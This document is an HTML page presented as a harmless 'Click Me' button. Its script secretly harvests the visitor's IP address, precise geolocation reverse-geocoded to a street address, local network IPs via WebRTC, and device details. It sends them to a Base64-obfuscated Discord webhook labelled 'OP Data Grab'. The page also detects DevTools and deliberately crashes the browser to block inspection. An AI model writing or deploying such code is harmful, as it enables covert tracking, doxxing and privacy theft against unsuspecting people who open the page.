<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Click Me</title>
    <style>
        /* Dark-themed, centered page */
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #1a1a1a;
            font-family: Arial, sans-serif;
            color: #fff;
        }

        .container {
            text-align: center;
        }

        h1 {
            font-size: 2em;
            margin-bottom: 20px;
            color: #00ff88;
        }

        #clickMeBtn {
            padding: 10px 20px;
            font-size: 1em;
            background-color: #ff0066;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: transform 0.2s;
        }

        #clickMeBtn:hover {
            transform: scale(1.05);
        }

        #clickMeBtn:active {
            transform: scale(0.95);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Click to Proceed</h1>
        <button id="clickMeBtn">Click Me</button>
    </div>

    <script>
        // Initialize data object and track basic behavior
        const data = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            behavior: {
                clicks: 0,
                dwellTime: 0
            }
        };
        let startTime = Date.now();

        // Obfuscated webhook URL (Base64 encoded)
        const encodedWebhook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2NTExNDg4NTc3OTg4NjI2MC9YUlZOWU0zM2FfV3hEeEtoV0FXZG5PS0tPVVlueS1Bd3pBUGktejNaM2R5NVNpMFZpbi1pV2loYXVhcEhONkdVZ1EyVg==';
        const decodeWebhook = () => atob(encodedWebhook);

        // Detect DevTools and crash browser
        (function detectDevTools() {
            const threshold = 160; // Pixel difference when DevTools opens
            const check = () => {
                if (window.outerWidth - window.innerWidth > threshold ||
                    window.outerHeight - window.innerHeight > threshold ||
                    (typeof console.profile === 'function' && console.profile.toString().includes('[native code]'))) {
                    // Crash browser with infinite recursion
                    (function crash() {
                        while (true) {
                            crash(); // Infinite recursion
                        }
                    })();
                }
            };
            setInterval(check, 500); // Check every 500ms
        })();

        // Add click event listener
        document.getElementById('clickMeBtn').addEventListener('click', async () => {
            // Decode webhook URL
            const webhookUrl = decodeWebhook();

            // Update behavior
            data.behavior.dwellTime = (Date.now() - startTime) / 1000;
            data.behavior.clicks += 1;

            // Function to send data to Discord webhook
            async function sendToWebhook(dataToSend, part = 1) {
                try {
                    console.log(`Attempting to send webhook (Part ${part})...`);
                    // Split data into chunks to avoid Discord's 2048-char limit
                    const jsonString = JSON.stringify(dataToSend, null, 2);
                    const maxLength = 1900;
                    const chunks = [];
                    for (let i = 0; i < jsonString.length; i += maxLength) {
                        chunks.push(jsonString.slice(i, i + maxLength));
                    }

                    for (let i = 0; i < chunks.length; i++) {
                        const response = await fetch(webhookUrl, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                content: `OP Data Grab (Part ${i + 1}/${chunks.length}):`,
                                embeds: [{
                                    title: `User Data (Part ${i + 1})`,
                                    description: `\`\`\`json\n${chunks[i]}\n\`\`\``,
                                    color: 0xff0066
                                }]
                            })
                        });
                        if (response.ok) {
                            console.log(`Webhook sent successfully (Part ${i + 1})`);
                        } else {
                            console.error(`Webhook failed (Part ${i + 1}) with status:`, response.status, response.statusText);
                        }
                    }
                } catch (err) {
                    console.error(`Webhook error (Part ${part}):`, err.message);
                    // Fallback: Send minimal data
                    if (part === 1) {
                        console.log('Sending fallback webhook...');
                        await fetch(webhookUrl, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                content: 'Fallback: Minimal Data',
                                embeds: [{
                                    title: 'User Data (Fallback)',
                                    description: `\`\`\`json\n${JSON.stringify({
                                        timestamp: data.timestamp,
                                        ip: data.ip || 'Unknown',
                                        geolocation: data.geolocation || 'Unknown',
                                        address: data.address || 'Unknown'
                                    }, null, 2)}\n\`\`\``,
                                    color: 0xff0066
                                }]
                            })
                        }).then(() => console.log('Fallback webhook sent'))
                          .catch(e => console.error('Fallback webhook error:', e.message));
                    }
                }
            }

            // Collect IP-based geolocation
            try {
                console.log('Fetching IP/geolocation...');
                const ipResponse = await fetch('https://ipapi.co/json/');
                const ipData = await ipResponse.json();
                data.ip = ipData.ip || 'Unknown';
                data.geolocation = {
                    source: 'ip',
                    city: ipData.city || 'Unknown',
                    region: ipData.region || 'Unknown',
                    country: ipData.country_name || 'Unknown',
                    latitude: ipData.latitude || 'Unknown',
                    longitude: ipData.longitude || 'Unknown',
                    postal: ipData.postal || 'Unknown',
                    isp: ipData.org || 'Unknown',
                    confidence: ipData.postal ? 0.5 : 0.2 // 50% if postal, 20% if city-level
                };
                data.address = ipData.postal ? `Postal Code: ${ipData.postal}` : 'Address unavailable';
                console.log('IP/geolocation fetched');
            } catch (err) {
                console.error('IP/geolocation error:', err.message);
                data.ip = 'Failed to retrieve';
                data.geolocation = { source: 'ip', error: 'Failed to retrieve', confidence: 0 };
                data.address = 'Failed to retrieve';
            }

            // Collect browser-based geolocation and reverse geocode
            try {
                console.log('Fetching browser geolocation...');
                await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            const { latitude, longitude, accuracy } = position.coords;
                            data.geolocation = {
                                source: 'browser',
                                latitude,
                                longitude,
                                accuracy, // Meters
                                confidence: accuracy < 100 ? 0.9 : accuracy < 500 ? 0.7 : 0.5
                            };

                            // Reverse geocode using Nominatim
                            try {
                                console.log('Reverse geocoding browser coordinates...');
                                const nominatimUrl = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`;
                                const response = await fetch(nominatimUrl, {
                                    headers: { 'User-Agent': 'OP-Data-Grab/1.0' }
                                });
                                const geoData = await response.json();
                                if (geoData.address) {
                                    const { road, house_number, city, state, postcode, country } = geoData.address;
                                    data.address = [
                                        house_number ? `${house_number} ${road}` : road,
                                        city || data.geolocation.city,
                                        state || data.geolocation.region,
                                        postcode || data.geolocation.postal,
                                        country || data.geolocation.country
                                    ].filter(Boolean).join(', ') || 'Address partially available';
                                } else {
                                    data.address = 'Reverse geocoding failed';
                                }
                                console.log('Reverse geocoding completed');
                            } catch (err) {
                                console.error('Reverse geocoding error:', err.message);
                                data.address = data.address || 'Reverse geocoding failed';
                            }
                            console.log('Browser geolocation fetched');
                            resolve();
                        },
                        (error) => {
                            console.error('Browser geolocation error:', error.message);
                            // Keep IP-based geolocation as fallback
                            resolve();
                        },
                        { timeout: 5000, maximumAge: 60000 }
                    );
                });
            } catch (err) {
                console.error('Browser geolocation error:', err.message);
            }

            // Collect PC specs
            try {
                console.log('Collecting PC specs...');
                data.specs = {
                    cpuCores: navigator.hardwareConcurrency || 'Unknown',
                    memoryGB: navigator.deviceMemory || 'Unknown',
                    os: navigator.platform || 'Unknown',
                    screen: {
                        width: window.screen.width,
                        height: window.screen.height,
                        colorDepth: window.screen.colorDepth,
                        pixelRatio: window.devicePixelRatio
                    },
                    network: navigator.connection ? {
                        effectiveType: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink,
                        rtt: navigator.connection.rtt
                    } : 'Unknown'
                };
                console.log('PC specs collected');
            } catch (err) {
                console.error('PC specs error:', err.message);
                data.specs = 'PC specs collection failed';
            }

            // Navigator properties
            try {
                console.log('Collecting navigator properties...');
                data.navigator = {
                    languages: navigator.languages,
                    plugins: Array.from(navigator.plugins).map(p => p.name),
                    platform: navigator.platform,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory || 'Unknown'
                };
                console.log('Navigator properties collected');
            } catch (err) {
                console.error('Navigator error:', err.message);
                data.navigator = 'Navigator properties failed';
            }

            // Battery status
            try {
                console.log('Checking battery...');
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    data.specs.battery = {
                        level: battery.level * 100,
                        charging: battery.charging
                    };
                } else {
                    data.specs.battery = 'Battery API not supported';
                }
                console.log('Battery checked');
            } catch (err) {
                console.error('Battery error:', err.message);
                data.specs.battery = 'Battery API error';
            }

            // Media devices
            try {
                console.log('Enumerating media devices...');
                const devices = await navigator.mediaDevices.enumerateDevices();
                data.specs.mediaDevices = devices.map(d => ({
                    kind: d.kind,
                    label: d.label || 'No label'
                }));
                console.log('Media devices enumerated');
            } catch (err) {
                console.error('Media devices error:', err.message);
                data.specs.mediaDevices = 'Media devices enumeration failed';
            }

            // WebRTC for local IP
            try {
                console.log('Attempting WebRTC...');
                const rtc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                rtc.createDataChannel('');
                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
                const localIps = new Set();
                rtc.onicecandidate = (event) => {
                    if (event.candidate) {
                        const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(event.candidate.candidate);
                        if (ipMatch) {
                            localIps.add(ipMatch[1]);
                        }
                    }
                };
                await new Promise(resolve => setTimeout(resolve, 1000));
                data.localIps = Array.from(localIps);
                rtc.close();
                console.log('WebRTC completed');
            } catch (err) {
                console.error('WebRTC error:', err.message);
                data.localIps = 'WebRTC disabled or failed';
            }

            // Referrer and history
            try {
                console.log('Collecting referrer and history...');
                data.referrer = document.referrer || 'None';
                data.historyLength = history.length;
                console.log('Referrer and history collected');
            } catch (err) {
                console.error('Referrer/history error:', err.message);
                data.referrer = 'Unknown';
                data.historyLength = 'Unknown';
            }

            // Send data to webhook
            console.log('Sending data to webhook...');
            await sendToWebhook(data);
        });
    </script>
</body>
</html>